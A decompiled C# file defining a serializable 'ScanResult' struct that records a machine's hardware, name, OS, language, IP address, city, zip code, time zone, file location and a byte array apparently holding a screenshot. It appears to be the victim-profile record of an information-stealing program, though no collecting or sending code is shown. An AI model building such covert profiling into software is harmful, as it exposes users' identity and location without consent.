using System;
using System.Runtime.Serialization;

// Token: 0x02000054 RID: 84
[DataContract(Name = "ScanResult", Namespace = "BrowserExtension")]
public struct ScanResult
{
	// Token: 0x17000051 RID: 81
	// (get) Token: 0x060001B2 RID: 434 RVA: 0x00009FA5 File Offset: 0x000081A5
	// (set) Token: 0x060001B3 RID: 435 RVA: 0x00009FAD File Offset: 0x000081AD
	[DataMember(Name = "Hardware")]
	public string Hardware { get; set; }

	// Token: 0x17000052 RID: 82
	// (get) Token: 0x060001B4 RID: 436 RVA: 0x00009FB6 File Offset: 0x000081B6
	// (set) Token: 0x060001B5 RID: 437 RVA: 0x00009FBE File Offset: 0x000081BE
	[DataMember(Name = "ReleaseID")]
	public string ReleaseID { get; set; }

	// Token: 0x17000053 RID: 83
	// (get) Token: 0x060001B6 RID: 438 RVA: 0x00009FC7 File Offset: 0x000081C7
	// (set) Token: 0x060001B7 RID: 439 RVA: 0x00009FCF File Offset: 0x000081CF
	[DataMember(Name = "MachineName")]
	public string MachineName { get; set; }

	// Token: 0x17000054 RID: 84
	// (get) Token: 0x060001B8 RID: 440 RVA: 0x00009FD8 File Offset: 0x000081D8
	// (set) Token: 0x060001B9 RID: 441 RVA: 0x00009FE0 File Offset: 0x000081E0
	[DataMember(Name = "OSVersion")]
	public string OSVersion { get; set; }

	// Token: 0x17000055 RID: 85
	// (get) Token: 0x060001BA RID: 442 RVA: 0x00009FE9 File Offset: 0x000081E9
	// (set) Token: 0x060001BB RID: 443 RVA: 0x00009FF1 File Offset: 0x000081F1
	[DataMember(Name = "Language")]
	public string Language { get; set; }

	// Token: 0x17000056 RID: 86
	// (get) Token: 0x060001BC RID: 444 RVA: 0x00009FFA File Offset: 0x000081FA
	// (set) Token: 0x060001BD RID: 445 RVA: 0x0000A002 File Offset: 0x00008202
	[DataMember(Name = "ScreenSize")]
	public string Resolution { get; set; }

	// Token: 0x17000057 RID: 87
	// (get) Token: 0x060001BE RID: 446 RVA: 0x0000A00B File Offset: 0x0000820B
	// (set) Token: 0x060001BF RID: 447 RVA: 0x0000A013 File Offset: 0x00008213
	[DataMember(Name = "ScanDetails")]
	public ScanDetails ScanDetails { get; set; }

	// Token: 0x17000058 RID: 88
	// (get) Token: 0x060001C0 RID: 448 RVA: 0x0000A01C File Offset: 0x0000821C
	// (set) Token: 0x060001C1 RID: 449 RVA: 0x0000A024 File Offset: 0x00008224
	[DataMember(Name = "Country")]
	public string Country { get; set; }

	// Token: 0x17000059 RID: 89
	// (get) Token: 0x060001C2 RID: 450 RVA: 0x0000A02D File Offset: 0x0000822D
	// (set) Token: 0x060001C3 RID: 451 RVA: 0x0000A035 File Offset: 0x00008235
	[DataMember(Name = "City")]
	public string City { get; set; }

	// Token: 0x1700005A RID: 90
	// (get) Token: 0x060001C4 RID: 452 RVA: 0x0000A03E File Offset: 0x0000823E
	// (set) Token: 0x060001C5 RID: 453 RVA: 0x0000A046 File Offset: 0x00008246
	[DataMember(Name = "TimeZone")]
	public string TimeZone { get; set; }

	// Token: 0x1700005B RID: 91
	// (get) Token: 0x060001C6 RID: 454 RVA: 0x0000A04F File Offset: 0x0000824F
	// (set) Token: 0x060001C7 RID: 455 RVA: 0x0000A057 File Offset: 0x00008257
	[DataMember(Name = "IPv4")]
	public string IPv4 { get; set; }

	// Token: 0x1700005C RID: 92
	// (get) Token: 0x060001C8 RID: 456 RVA: 0x0000A060 File Offset: 0x00008260
	// (set) Token: 0x060001C9 RID: 457 RVA: 0x0000A068 File Offset: 0x00008268
	[DataMember(Name = "Monitor")]
	public byte[] Monitor { get; set; }

	// Token: 0x1700005D RID: 93
	// (get) Token: 0x060001CA RID: 458 RVA: 0x0000A071 File Offset: 0x00008271
	// (set) Token: 0x060001CB RID: 459 RVA: 0x0000A079 File Offset: 0x00008279
	[DataMember(Name = "ZipCode")]
	public string ZipCode { get; set; }

	// Token: 0x1700005E RID: 94
	// (get) Token: 0x060001CC RID: 460 RVA: 0x0000A082 File Offset: 0x00008282
	// (set) Token: 0x060001CD RID: 461 RVA: 0x0000A08A File Offset: 0x0000828A
	[DataMember(Name = "FileLocation")]
	public string FileLocation { get; set; }

	// Token: 0x1700005F RID: 95
	// (get) Token: 0x060001CE RID: 462 RVA: 0x0000A093 File Offset: 0x00008293
	// (set) Token: 0x060001CF RID: 463 RVA: 0x0000A09B File Offset: 0x0000829B
	[DataMember(Name = "SeenBefore")]
	public bool SeenBefore { get; set; }
}
